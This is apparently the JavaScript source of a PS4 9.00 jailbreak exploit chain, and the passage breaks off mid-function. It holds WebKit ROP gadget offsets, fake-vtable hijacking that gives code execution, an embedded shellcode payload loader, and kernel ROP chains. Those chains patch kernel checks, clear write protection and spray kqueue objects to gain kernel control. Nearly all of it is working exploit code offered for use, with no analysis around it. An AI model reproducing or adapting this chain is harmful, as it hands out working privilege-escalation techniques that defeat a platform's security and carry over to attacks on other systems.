/////////////////////// PS4 9.00 Exploit Chain restructured/reorganised By Leeful (Original Webkit and Kernel Exploits By Sleirsgoevy & ChendoChap)
const OFFSET_wk_vtable_first_element = 0x104f110;
const OFFSET_WK_memset_import = 0x000002a8;
const OFFSET_WK___stack_chk_fail_import = 0x00000178;
const OFFSET_WK_psl_builtin_import = 0xd68;
const OFFSET_WKR_psl_builtin = 0x33ba0;
const OFFSET_WK_setjmp_gadget_one = 0x0106acf7;
const OFFSET_WK_setjmp_gadget_two = 0x01ece1d3;
const OFFSET_WK_longjmp_gadget_one = 0x0106acf7;
const OFFSET_WK_longjmp_gadget_two = 0x01ece1d3;
const OFFSET_libcint_memset = 0x0004f810;
const OFFSET_libcint_setjmp = 0x000bb5bc;
const OFFSET_libcint_longjmp = 0x000bb616;
const OFFSET_WK2_TLS_IMAGE = 0x38e8020;
const OFFSET_lk___stack_chk_fail = 0x0001ff60;
const OFFSET_lk_pthread_create = 0x00025510;
const OFFSET_lk_pthread_join = 0x0000afa0;
var chain;
var kchain;
var kchain2;
var SAVED_KERNEL_STACK_PTR;
var KERNEL_BASE_PTR;
var webKitBase;
var webKitRequirementBase;
var libSceLibcInternalBase;
var libKernelBase;
var textArea = document.createElement("textarea");
var nogc = [];
var syscalls = {};
var gadgets = {};
var wk_gadgetmap = {
  ret: 0x32,
  "pop rdi": 0x319690,
  "pop rsi": 0x1f4d6,
  "pop rdx": 0x986c,
  "pop rcx": 0x657b7,
  "pop r8": 0xafaa71,
  "pop r9": 0x422571,
  "pop rax": 0x51a12,
  "pop rsp": 0x4e293,
  "mov [rdi], rsi": 0x1a97920,
  "mov [rdi], rax": 0x10788f7,
  "mov [rdi], eax": 0x9964bc,
  "cli ; pop rax": 0x566f8,
  sti: 0x1fbbcc,
  "mov rax, [rax]": 0x241cc,
  "mov rax, [rsi]": 0x5106a0,
  "mov [rax], rsi": 0x1efd890,
  "mov [rax], rdx": 0x1426a82,
  "mov [rax], edx": 0x3b7fe4,
  "add rax, rsi": 0x170397e,
  "mov rdx, rax": 0x53f501,
  "add rax, rcx": 0x2fbcd,
  "mov rsp, rdi": 0x2048062,
  "mov rdi, [rax + 8] ; call [rax]": 0x751ee7,
  infloop: 0x7dff,
  "mov [rax], cl": 0xc6eaf,
};
var wkr_gadgetmap = { "xchg rdi, rsp ; call [rsi - 0x79]": 0x1d74f0 };
var wk2_gadgetmap = {
  "mov [rax], rdi": 0xffdd7,
  "mov [rax], rcx": 0x2c9eca,
  "mov [rax], cx": 0x15a7d52,
};
var hmd_gadgetmap = { "add [r8], r12": 0x2bce1 };
var ipmi_gadgetmap = {
  "mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]": 0x344b,
};

function CalcTime(dur) {
  hrs = Math.floor(dur / 1000 / 60 / 60);
  min = Math.floor(dur / 1000 / 60 - hrs * 60);
  sec = Math.floor(dur / 1000 - min * 60);
  mil = dur.toString().slice(-3);
  if (min != 0) {
    ShowDuration =
      " - Webkit Exploited In : " +
      min +
      " minute" +
      (min == 1 ? "" : "s") +
      ", " +
      sec +
      " second" +
      (sec == 1 ? "" : "s");
  } else {
    ShowDuration =
      " - WK Exploited In: " + sec + " second" + (sec == 1 ? "" : "s");
  }
}
function StartTimer() {
  StartTime = Date.now();
}
function EndTimer() {
  EndTime = Date.now();
  CalcTime((EndTime = Date.now() - StartTime));
  top.document.title += ShowDuration;
}

function run_hax() {
  userland();
  if (chain.syscall(23, 0).low != 0x0) {
    localStorage.HenLoaded = "no";
    return kernelExploit();
    //alert("\n\nNow remove the USB drive then click OK to continue");
  }
  if (chain.syscall(23, 0).low == 0) {
    return true;
  }
}

function runBinLoader() {
  var payload_buffer = chain.syscall(
    477,
    0x0,
    0x300000,
    0x7,
    0x1000,
    0xffffffff,
    0
  );
  var payload_loader = p.malloc32(0x1000);
  var BLDR = payload_loader.backing;
  BLDR[0] = 0x56415741;
  BLDR[1] = 0x83485541;
  BLDR[2] = 0x894818ec;
  BLDR[3] = 0xc748243c;
  BLDR[4] = 0x10082444;
  BLDR[5] = 0x483c2302;
  BLDR[6] = 0x102444c7;
  BLDR[7] = 0x00000000;
  BLDR[8] = 0x000002bf;
  BLDR[9] = 0x0001be00;
  BLDR[10] = 0xd2310000;
  BLDR[11] = 0x00009ce8;
  BLDR[12] = 0xc7894100;
  BLDR[13] = 0x8d48c789;
  BLDR[14] = 0xba082474;
  BLDR[15] = 0x00000010;
  BLDR[16] = 0x000095e8;
  BLDR[17] = 0xff894400;
  BLDR[18] = 0x000001be;
  BLDR[19] = 0x0095e800;
  BLDR[20] = 0x89440000;
  BLDR[21] = 0x31f631ff;
  BLDR[22] = 0x0062e8d2;
  BLDR[23] = 0x89410000;
  BLDR[24] = 0x2c8b4cc6;
  BLDR[25] = 0x45c64124;
  BLDR[26] = 0x05ebc300;
  BLDR[27] = 0x01499848;
  BLDR[28] = 0xf78944c5;
  BLDR[29] = 0xbaee894c;
  BLDR[30] = 0x00001000;
  BLDR[31] = 0x000025e8;
  BLDR[32] = 0x7fc08500;
  BLDR[33] = 0xff8944e7;
  BLDR[34] = 0x000026e8;
  BLDR[35] = 0xf7894400;
  BLDR[36] = 0x00001ee8;
  BLDR[37] = 0x2414ff00;
  BLDR[38] = 0x18c48348;
  BLDR[39] = 0x5e415d41;
  BLDR[40] = 0x31485f41;
  BLDR[41] = 0xc748c3c0;
  BLDR[42] = 0x000003c0;
  BLDR[43] = 0xca894900;
  BLDR[44] = 0x48c3050f;
  BLDR[45] = 0x0006c0c7;
  BLDR[46] = 0x89490000;
  BLDR[47] = 0xc3050fca;
  BLDR[48] = 0x1ec0c748;
  BLDR[49] = 0x49000000;
  BLDR[50] = 0x050fca89;
  BLDR[51] = 0xc0c748c3;
  BLDR[52] = 0x00000061;
  BLDR[53] = 0x0fca8949;
  BLDR[54] = 0xc748c305;
  BLDR[55] = 0x000068c0;
  BLDR[56] = 0xca894900;
  BLDR[57] = 0x48c3050f;
  BLDR[58] = 0x006ac0c7;
  BLDR[59] = 0x89490000;
  BLDR[60] = 0xc3050fca;
  chain.syscall(74, payload_loader, 0x4000, 0x1 | 0x2 | 0x4);
  var pthread = p.malloc(0x10);
  {
    chain.fcall(window.syscalls[203], payload_buffer, 0x300000);
    chain.fcall(
      libKernelBase.add32(OFFSET_lk_pthread_create),
      pthread,
      0x0,
      payload_loader,
      payload_buffer
    );
  }
  chain.run();
  return true;
}

function loadPayload(payload) {
  var payload_buffer = chain.syscall(
    477,
    0,
    payload.byteLength * 4,
    7,
    0x1002,
    -1,
    0
  );
  var pl = p.array_from_address(payload_buffer, payload.byteLength * 4);
  var padding = new Uint8Array(4 - ((payload.byteLength % 4) % 4));
  var tmp = new Uint8Array(payload.byteLength + padding.byteLength);
  tmp.set(new Uint8Array(payload), 0);
  tmp.set(padding, payload.byteLength);
  var shellcode = new Uint32Array(tmp.buffer);
  pl.set(shellcode, 0);
  var pthread = p.malloc(0x10);
  chain.call(
    libKernelBase.add32(OFFSET_lk_pthread_create),
    pthread,
    0x0,
    payload_buffer,
    0
  );
  return true;
}

function int64(low, hi) {
  this.low = low >>> 0;
  this.hi = hi >>> 0;
  this.add32inplace = function (val) {
    var new_lo = (((this.low >>> 0) + val) & 0xffffffff) >>> 0;
    var new_hi = this.hi >>> 0;
    if (new_lo < this.low) {
      new_hi++;
    }
    this.hi = new_hi;
    this.low = new_lo;
  };
  this.add32 = function (val) {
    var new_lo = (((this.low >>> 0) + val) & 0xffffffff) >>> 0;
    var new_hi = this.hi >>> 0;
    if (new_lo < this.low) {
      new_hi++;
    }
    return new int64(new_lo, new_hi);
  };
  this.sub32 = function (val) {
    var new_lo = (((this.low >>> 0) - val) & 0xffffffff) >>> 0;
    var new_hi = this.hi >>> 0;
    if ((new_lo > this.low) & 0xffffffff) {
      new_hi--;
    }
    return new int64(new_lo, new_hi);
  };
  this.sub32inplace = function (val) {
    var new_lo = (((this.low >>> 0) - val) & 0xffffffff) >>> 0;
    var new_hi = this.hi >>> 0;
    if ((new_lo > this.low) & 0xffffffff) {
      new_hi--;
    }
    this.hi = new_hi;
    this.low = new_lo;
  };
  this.and32 = function (val) {
    var new_lo = this.low & val;
    var new_hi = this.hi;
    return new int64(new_lo, new_hi);
  };
  this.and64 = function (vallo, valhi) {
    var new_lo = this.low & vallo;
    var new_hi = this.hi & valhi;
    return new int64(new_lo, new_hi);
  };
  function zeroFill(number, width) {
    width -= number.toString().length;
    if (width > 0) {
      return new Array(width + (/\./.test(number) ? 2 : 1)).join("0") + number;
    }
    return number + "";
  }
  this.toString = function (val) {
    val = 16;
    var lo_str = (this.low >>> 0).toString(val);
    var hi_str = (this.hi >>> 0).toString(val);
    if (this.hi == 0) return lo_str;
    else lo_str = zeroFill(lo_str, 8);
    return hi_str + lo_str;
  };
  return this;
}

window.rop = function () {
  const stack_sz = 0x40000;
  const reserve_upper_stack = 0x10000;
  const stack_reserved_idx = reserve_upper_stack / 4;
  this.stackback = p.malloc32(stack_sz / 4 + 0x8);
  this.stack = this.stackback.add32(reserve_upper_stack);
  this.stack_array = this.stackback.backing;
  this.retval = this.stackback.add32(stack_sz);
  this.count = 1;
  this.branches_count = 0;
  this.branches_rsps = p.malloc(0x200);
  this.clear = function () {
    this.count = 1;
    this.branches_count = 0;
    for (var i = 1; i < stack_sz / 4 - stack_reserved_idx; i++) {
      this.stack_array[i + stack_reserved_idx] = 0;
    }
  };
  this.pushSymbolic = function () {
    this.count++;
    return this.count - 1;
  };
  this.finalizeSymbolic = function (idx, val) {
    if (val instanceof int64) {
      this.stack_array[stack_reserved_idx + idx * 2] = val.low;
      this.stack_array[stack_reserved_idx + idx * 2 + 1] = val.hi;
    } else {
      this.stack_array[stack_reserved_idx + idx * 2] = val;
      this.stack_array[stack_reserved_idx + idx * 2 + 1] = 0;
    }
  };
  this.push = function (val) {
    this.finalizeSymbolic(this.pushSymbolic(), val);
  };
  this.push_write8 = function (where, what) {
    this.push(gadgets["pop rdi"]);
    this.push(where);
    this.push(gadgets["pop rsi"]);
    this.push(what);
    this.push(gadgets["mov [rdi], rsi"]);
  };
  this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
    if (rdi != undefined) {
      this.push(gadgets["pop rdi"]);
      this.push(rdi);
    }
    if (rsi != undefined) {
      this.push(gadgets["pop rsi"]);
      this.push(rsi);
    }
    if (rdx != undefined) {
      this.push(gadgets["pop rdx"]);
      this.push(rdx);
    }
    if (rcx != undefined) {
      this.push(gadgets["pop rcx"]);
      this.push(rcx);
    }
    if (r8 != undefined) {
      this.push(gadgets["pop r8"]);
      this.push(r8);
    }
    if (r9 != undefined) {
      this.push(gadgets["pop r9"]);
      this.push(r9);
    }
    if (this.stack.add32(this.count * 0x8).low & 0x8) {
      this.push(gadgets["ret"]);
    }
    this.push(rip);
    return this;
  };
  this.call = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
    this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
    this.write_result(this.retval);
    this.run();
    return p.read8(this.retval);
  };
  this.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
    return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
  };
  this.get_rsp = function () {
    return this.stack.add32(this.count * 8);
  };
  this.write_result = function (where) {
    this.push(gadgets["pop rdi"]);
    this.push(where);
    this.push(gadgets["mov [rdi], rax"]);
  };
  this.write_result4 = function (where) {
    this.push(gadgets["pop rdi"]);
    this.push(where);
    this.push(gadgets["mov [rdi], eax"]);
  };
  this.jmp_rsp = function (rsp) {
    this.push(window.gadgets["pop rsp"]);
    this.push(rsp);
  };
  this.run = function () {
    p.launch_chain(this);
    this.clear();
  };
  this.KERNEL_BASE_PTR_VAR;
  this.set_kernel_var = function (arg) {
    this.KERNEL_BASE_PTR_VAR = arg;
  };
  this.rax_kernel = function (offset) {
    this.push(gadgets["pop rax"]);
    this.push(this.KERNEL_BASE_PTR_VAR);
    this.push(gadgets["mov rax, [rax]"]);
    this.push(gadgets["pop rsi"]);
    this.push(offset);
    this.push(gadgets["add rax, rsi"]);
  };
  this.write_kernel_addr_to_chain_later = function (offset) {
    this.push(gadgets["pop rdi"]);
    var idx = this.pushSymbolic();
    this.rax_kernel(offset);
    this.push(gadgets["mov [rdi], rax"]);
    return idx;
  };
  this.kwrite8 = function (offset, qword) {
    this.rax_kernel(offset);
    this.push(gadgets["pop rsi"]);
    this.push(qword);
    this.push(gadgets["mov [rax], rsi"]);
  };
  this.kwrite4 = function (offset, dword) {
    this.rax_kernel(offset);
    this.push(gadgets["pop rdx"]);
    this.push(dword);
    this.push(gadgets["mov [rax], edx"]);
  };
  this.kwrite2 = function (offset, word) {
    this.rax_kernel(offset);
    this.push(gadgets["pop rcx"]);
    this.push(word);
    this.push(gadgets["mov [rax], cx"]);
  };
  this.kwrite1 = function (offset, byte) {
    this.rax_kernel(offset);
    this.push(gadgets["pop rcx"]);
    this.push(byte);
    this.push(gadgets["mov [rax], cl"]);
  };
  this.kwrite8_kaddr = function (offset1, offset2) {
    this.rax_kernel(offset2);
    this.push(gadgets["mov rdx, rax"]);
    this.rax_kernel(offset1);
    this.push(gadgets["mov [rax], rdx"]);
  };
  return this;
};

function userland() {
  p.launch_chain = launch_chain;
  p.malloc = malloc;
  p.malloc32 = malloc32;
  p.stringify = stringify;
  p.array_from_address = array_from_address;
  p.readstr = readstr;
  var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
  var textAreaVtable = p.read8(textAreaVtPtr);
  webKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
  libSceLibcInternalBase = p.read8(
    get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import))
  );
  libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);
  libKernelBase = p.read8(
    get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import))
  );
  libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);
  webKitRequirementBase = p.read8(
    get_jmptgt(webKitBase.add32(OFFSET_WK_psl_builtin_import))
  );
  webKitRequirementBase.sub32inplace(OFFSET_WKR_psl_builtin);
  for (var gadget in wk_gadgetmap) {
    window.gadgets[gadget] = webKitBase.add32(wk_gadgetmap[gadget]);
  }
  for (var gadget in wkr_gadgetmap) {
    window.gadgets[gadget] = webKitRequirementBase.add32(wkr_gadgetmap[gadget]);
  }
  function get_jmptgt(address) {
    var instr = p.read4(address) & 0xffff;
    var offset = p.read4(address.add32(2));
    if (instr != 0x25ff) {
      return 0;
    }
    return address.add32(0x6 + offset);
  }
  function malloc(sz) {
    var backing = new Uint8Array(0x10000 + sz);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = backing;
    return ptr;
  }
  function malloc32(sz) {
    var backing = new Uint8Array(0x10000 + sz * 4);
    window.nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(0x10));
    ptr.backing = new Uint32Array(backing.buffer);
    return ptr;
  }
  function array_from_address(addr, size) {
    var og_array = new Uint32Array(0x1000);
    var og_array_i = p.leakval(og_array).add32(0x10);
    p.write8(og_array_i, addr);
    p.write4(og_array_i.add32(0x8), size);
    p.write4(og_array_i.add32(0xc), 0x1);
    nogc.push(og_array);
    return og_array;
  }
  function stringify(str) {
    var bufView = new Uint8Array(str.length + 1);
    for (var i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xff;
    }
    window.nogc.push(bufView);
    return p.read8(p.leakval(bufView).add32(0x10));
  }
  function readstr(addr) {
    var str = "";
    for (var i = 0; ; i++) {
      var c = p.read1(addr.add32(i));
      if (c == 0x0) {
        break;
      }
      str += String.fromCharCode(c);
    }
    return str;
  }
  var fakeVtable_setjmp = p.malloc32(0x200);
  var fakeVtable_longjmp = p.malloc32(0x200);
  var original_context = p.malloc32(0x40);
  var modified_context = p.malloc32(0x40);
  p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
  p.write8(
    fakeVtable_setjmp.add32(0xa8),
    webKitBase.add32(OFFSET_WK_setjmp_gadget_two)
  );
  p.write8(fakeVtable_setjmp.add32(0x10), original_context);
  p.write8(
    fakeVtable_setjmp.add32(0x8),
    libSceLibcInternalBase.add32(OFFSET_libcint_setjmp)
  );
  p.write8(
    fakeVtable_setjmp.add32(0x1c8),
    webKitBase.add32(OFFSET_WK_setjmp_gadget_one)
  );
  p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
  p.write8(
    fakeVtable_longjmp.add32(0xa8),
    webKitBase.add32(OFFSET_WK_longjmp_gadget_two)
  );
  p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
  p.write8(
    fakeVtable_longjmp.add32(0x8),
    libSceLibcInternalBase.add32(OFFSET_libcint_longjmp)
  );
  p.write8(
    fakeVtable_longjmp.add32(0x1c8),
    webKitBase.add32(OFFSET_WK_longjmp_gadget_one)
  );
  function launch_chain(chain) {
    chain.push(window.gadgets["pop rdi"]);
    chain.push(original_context);
    chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
    p.write8(textAreaVtPtr, fakeVtable_setjmp);
    textArea.scrollLeft = 0x0;
    p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
    p.write8(modified_context.add32(0x10), chain.stack);
    p.write8(
      modified_context.add32(0x40),
      p.read8(original_context.add32(0x40))
    );
    p.write8(textAreaVtPtr, fakeVtable_longjmp);
    textArea.scrollLeft = 0x0;
    p.write8(textAreaVtPtr, textAreaVtable);
  }
  var kview = new Uint8Array(0x1000);
  var kstr = p.leakval(kview).add32(0x10);
  var orig_kview_buf = p.read8(kstr);
  p.write8(kstr, window.libKernelBase);
  p.write4(kstr.add32(8), 0x40000);
  var countbytes;
  for (var i = 0; i < 0x40000; i++) {
    if (
      kview[i] == 0x72 &&
      kview[i + 1] == 0x64 &&
      kview[i + 2] == 0x6c &&
      kview[i + 3] == 0x6f &&
      kview[i + 4] == 0x63
    ) {
      countbytes = i;
      break;
    }
  }
  p.write4(kstr.add32(8), countbytes + 32);
  var dview32 = new Uint32Array(1);
  var dview8 = new Uint8Array(dview32.buffer);
  for (var i = 0; i < countbytes; i++) {
    if (
      kview[i] == 0x48 &&
      kview[i + 1] == 0xc7 &&
      kview[i + 2] == 0xc0 &&
      kview[i + 7] == 0x49 &&
      kview[i + 8] == 0x89 &&
      kview[i + 9] == 0xca &&
      kview[i + 10] == 0x0f &&
      kview[i + 11] == 0x05
    ) {
      dview8[0] = kview[i + 3];
      dview8[1] = kview[i + 4];
      dview8[2] = kview[i + 5];
      dview8[3] = kview[i + 6];
      var syscallno = dview32[0];
      window.syscalls[syscallno] = window.libKernelBase.add32(i);
    }
  }
  p.write8(kstr, orig_kview_buf);
  chain = new rop();
  if (chain.syscall(20).low == 0) {
    alert("Webkit Exploit Failed. Try Again.");
    while (1);
  }
}

function kernelExploit() {
  var handle;
  var random_path;
  var ex_info;

  function load_prx(name) {
    var res = chain.syscall(
      594,
      p.stringify(`/${random_path}/common/lib/${name}`),
      0x0,
      handle,
      0x0
    );
    if (res.low != 0x0) {
      alert("failed to load prx/get handle " + name);
    }
    p.write8(ex_info, 0x1a8);
    res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
    if (res.low != 0x0) {
      alert("failed to get module info from handle");
    }
    var tlsinit = p.read8(ex_info.add32(0x110));
    var tlssize = p.read4(ex_info.add32(0x11c));
    if (tlssize != 0) {
      if (name == "libSceWebKit2.sprx") {
        tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);
      } else {
        alert(
          `${name}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`
        );
      }
    }
    return tlsinit;
  }

  function extra_gadgets() {
    handle = p.malloc(0x1e8);
    var randomized_path_length_ptr = handle.add32(0x4);
    var randomized_path_ptr = handle.add32(0x14);
    ex_info = randomized_path_ptr.add32(0x40);
    p.write8(randomized_path_length_ptr, 0x2c);
    chain.syscall(602, 0, randomized_path_ptr, randomized_path_length_ptr);
    random_path = p.readstr(randomized_path_ptr);
    var ipmi_addr = load_prx("libSceIpmi.sprx");
    var hmd_addr = load_prx("libSceHmd.sprx");
    var wk2_addr = load_prx("libSceWebKit2.sprx");
    for (var gadget in hmd_gadgetmap) {
      window.gadgets[gadget] = hmd_addr.add32(hmd_gadgetmap[gadget]);
    }
    for (var gadget in wk2_gadgetmap) {
      window.gadgets[gadget] = wk2_addr.add32(wk2_gadgetmap[gadget]);
    }
    for (var gadget in ipmi_gadgetmap) {
      window.gadgets[gadget] = ipmi_addr.add32(ipmi_gadgetmap[gadget]);
    }
    for (var gadget in window.gadgets) {
      p.read8(window.gadgets[gadget]);
      chain.fcall(window.syscalls[203], window.gadgets[gadget], 0x10);
    }
    chain.run();
  }

  function kchain_setup() {
    const KERNEL_busy = 0x1b28df8;
    const KERNEL_bcopy = 0xacd;
    const KERNEL_bzero = 0x2713fd;
    const KERNEL_pagezero = 0x271441;
    const KERNEL_memcpy = 0x2714bd;
    const KERNEL_pagecopy = 0x271501;
    const KERNEL_copyin = 0x2716ad;
    const KERNEL_copyinstr = 0x271b5d;
    const KERNEL_copystr = 0x271c2d;
    const KERNEL_setidt = 0x312c40;
    const KERNEL_setcr0 = 0x1fb949;
    const KERNEL_Xill = 0x17d500;
    const KERNEL_veriPatch = 0x626874;
    const KERNEL_enable_syscalls_1 = 0x490;
    const KERNEL_enable_syscalls_2 = 0x4b5;
    const KERNEL_enable_syscalls_3 = 0x4b9;
    const KERNEL_enable_syscalls_4 = 0x4c2;
    const KERNEL_mprotect = 0x80b8d;
    const KERNEL_prx = 0x23aec4;
    const KERNEL_dlsym_1 = 0x23b67f;
    const KERNEL_dlsym_2 = 0x221b40;
    const KERNEL_setuid = 0x1a06;
    const KERNEL_syscall11_1 = 0x1100520;
    const KERNEL_syscall11_2 = 0x1100528;
    const KERNEL_syscall11_3 = 0x110054c;
    const KERNEL_syscall11_gadget = 0x4c7ad;
    const KERNEL_mmap_1 = 0x16632a;
    const KERNEL_mmap_2 = 0x16632d;
    const KERNEL_setcr0_patch = 0x3ade3b;
    const KERNEL_kqueue_close_epi = 0x398991;
    SAVED_KERNEL_STACK_PTR = p.malloc(0x200);
    KERNEL_BASE_PTR = SAVED_KERNEL_STACK_PTR.add32(0x8);
    p.write8(KERNEL_BASE_PTR, new int64(0xff80e364, 0xffffffff));
    kchain = new rop();
    kchain2 = new rop();
    {
      chain.fcall(window.syscalls[203], kchain.stackback, 0x40000);
      chain.fcall(window.syscalls[203], kchain2.stackback, 0x40000);
      chain.fcall(window.syscalls[203], SAVED_KERNEL_STACK_PTR, 0x10);
    }
    chain.run();
    kchain.count = 0;
    kchain2.count = 0;
    kchain.set_kernel_var(KERNEL_BASE_PTR);
    kchain2.set_kernel_var(KERNEL_BASE_PTR);
    kchain.push(gadgets["pop rax"]);
    kchain.push(SAVED_KERNEL_STACK_PTR);
    kchain.push(gadgets["mov [rax], rdi"]);
    kchain.push(gadgets["pop r8"]);
    kchain.push(KERNEL_BASE_PTR);
    kchain.push(gadgets["add [r8], r12"]);
    kchain.kwrite1(KERNEL_busy, 0x1);
    kchain.push(gadgets["sti"]);
    var idx1 = kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);
    var idx2 = kchain.write_kernel_addr_to_chain_later(KERNEL_setcr0);
    kchain.push(gadgets["pop rdi"]);
    kchain.push(0x6);
    kchain.push(gadgets["pop rsi"]);
    kchain.push(gadgets["mov rsp, rdi"]);
    kchain.push(gadgets["pop rdx"]);
    kchain.push(0xe);
    kchain.push(gadgets["pop rcx"]);
    kchain.push(0x0);
    kchain.push(gadgets["pop r8"]);
    kchain.push(0x0);
    var idx1_dest = kchain.get_rsp();
    kchain.pushSymbolic();
    kchain.push(gadgets["pop rsi"]);
    kchain.push(0x80040033);
    kchain.push(gadgets["pop rdi"]);
    kchain.push(kchain2.stack);
    var idx2_dest = kchain.get_rsp();
    kchain.pushSymbolic();
    kchain.finalizeSymbolic(idx1, idx1_dest);
    kchain.finalizeSymbolic(idx2, idx2_dest);
    kchain2.kwrite2(KERNEL_veriPatch, 0x9090);
    kchain2.kwrite1(KERNEL_bcopy, 0xeb);
    kchain2.kwrite1(KERNEL_bzero, 0xeb);
    kchain2.kwrite1(KERNEL_pagezero, 0xeb);
    kchain2.kwrite1(KERNEL_memcpy, 0xeb);
    kchain2.kwrite1(KERNEL_pagecopy, 0xeb);
    kchain2.kwrite1(KERNEL_copyin, 0xeb);
    kchain2.kwrite1(KERNEL_copyinstr, 0xeb);
    kchain2.kwrite1(KERNEL_copystr, 0xeb);
    kchain2.kwrite1(KERNEL_busy, 0x0);
    var idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
    var idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
    kchain2.push(gadgets["pop rdi"]);
    kchain2.push(0x6);
    kchain2.push(gadgets["pop rsi"]);
    var idx3_dest = kchain2.get_rsp();
    kchain2.pushSymbolic();
    kchain2.push(gadgets["pop rdx"]);
    kchain2.push(0xe);
    kchain2.push(gadgets["pop rcx"]);
    kchain2.push(0x0);
    kchain2.push(gadgets["pop r8"]);
    kchain2.push(0x0);
    var idx4_dest = kchain2.get_rsp();
    kchain2.pushSymbolic();
    kchain2.finalizeSymbolic(idx3, idx3_dest);
    kchain2.finalizeSymbolic(idx4, idx4_dest);
    kchain2.kwrite4(KERNEL_enable_syscalls_1, 0x00000000);
    kchain2.kwrite1(KERNEL_enable_syscalls_4, 0xeb);
    kchain2.kwrite2(KERNEL_enable_syscalls_3, 0x9090);
    kchain2.kwrite2(KERNEL_enable_syscalls_2, 0x9090);
    kchain2.kwrite1(KERNEL_setuid, 0xeb);
    kchain2.kwrite4(KERNEL_mprotect, 0x00000000);
    kchain2.kwrite2(KERNEL_prx, 0xe990);
    kchain2.kwrite1(KERNEL_dlsym_1, 0xeb);
    kchain2.kwrite4(KERNEL_dlsym_2, 0xc3c03148);
    kchain2.kwrite1(KERNEL_mmap_1, 0x37);
    kchain2.kwrite1(KERNEL_mmap_2, 0x37);
    kchain2.kwrite4(KERNEL_syscall11_1, 0x00000002);
    kchain2.kwrite8_kaddr(KERNEL_syscall11_2, KERNEL_syscall11_gadget);
    kchain2.kwrite4(KERNEL_syscall11_3, 0x00000001);
    kchain2.kwrite4(KERNEL_setcr0_patch, 0xc3c7220f);
    var idx5 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);
    kchain2.push(gadgets["pop rdi"]);
    kchain2.push(0x80050033);
    var idx5_dest = kchain2.get_rsp();
    kchain2.pushSymbolic();
    kchain2.finalizeSymbolic(idx5, idx5_dest);
    kchain2.rax_kernel(KERNEL_kqueue_close_epi);
    kchain2.push(gadgets["mov rdx, rax"]);
    kchain2.push(gadgets["pop rsi"]);
    kchain2.push(SAVED_KERNEL_STACK_PTR);
    kchain2.push(gadgets["mov rax, [rsi]"]);
    kchain2.push(gadgets["pop rcx"]);
    kchain2.push(0x10);
    kchain2.push(gadgets["add rax, rcx"]);
    kchain2.push(gadgets["mov [rax], rdx"]);
    kchain2.push(gadgets["pop rdi"]);
    var idx6 = kchain2.pushSymbolic();
    kchain2.push(gadgets["mov [rdi], rax"]);
    kchain2.push(gadgets["sti"]);
    kchain2.push(gadgets["pop rsp"]);
    var idx6_dest = kchain2.get_rsp();
    kchain2.pushSymbolic();
    kchain2.finalizeSymbolic(idx6, idx6_dest);
  }

  function object_setup() {
    var fake_knote = chain.syscall(
      477,
      0x4000,
      0x4000 * 0x3,
      0x3,
      0x1010,
      0xffffffff,
      0x0
    );
    var fake_filtops = fake_knote.add32(0x4000);
    var fake_obj = fake_knote.add32(0x8000);
    if (fake_knote.low != 0x4000) {
      alert("enomem: " + fake_knote);
      while (1);
    }
    {
      p.write8(fake_knote, fake_obj);
      p.write8(fake_knote.add32(0x68), fake_filtops);
    }
    {
      p.write8(fake_filtops.sub32(0x79), gadgets["cli ; pop rax"]);
      p.write8(
        fake_filtops.add32(0x0),
        gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]
      );
      p.write8(fake_filtops.add32(0x8), kchain.stack);
      p.write8(
        fake_filtops.add32(0x10),
        gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]
      );
    }
    {
      p.write8(
        fake_obj.add32(0x30),
        gadgets["mov rdi, [rax + 8] ; call [rax]"]
      );
    }
    chain.syscall(203, fake_knote, 0xc000);
  }

  var trigger_spray = function () {
    var NUM_KQUEUES = 0x1b0;
    var kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4);
    {
      for (var i = 0; i < NUM_KQUEUES; i++) {
        chain.fcall(window.syscalls[362]);
        chain.write_result4(kqueue_ptr.add32(0x4 * i));
      }
    }
    chain.run();
    var kqueues = p.array_from_address(kqueue_ptr, NUM_KQUEUES);
    var that_one_socket = chain.syscall(97, 2, 1, 0);
    if (that_one_socket.low < 0x100 || that_one_socket.low >= 0x200) {
      alert("invalid socket");
      while (1);
    }
    var kevent = p.malloc(0x20);
    p.write8(kevent.add32(0x0), that_one_socket);
    p.write4(kevent.add32(0x8), 0xffff + 0x010000);
    p.write4(kevent.add32(0xc), 0x0);
    p.write8(kevent.add32(0x10), 0x0);
    p.write8(kevent.add32(0x18), 0x0);
    for (var i = 0; i < NUM_KQUEUES; i++)
      chain.fcall(window.syscalls[363], kqueues[i], kevent, 0x1, 0x0, 0x0, 0x0);
    for (var i = 18; i < NUM_KQUEUES; i += 2)
      chain.fcall(window.syscalls[6], kqueues[i]);
    chain.run();

    CallCgi("load_mass_storage");
    alert(
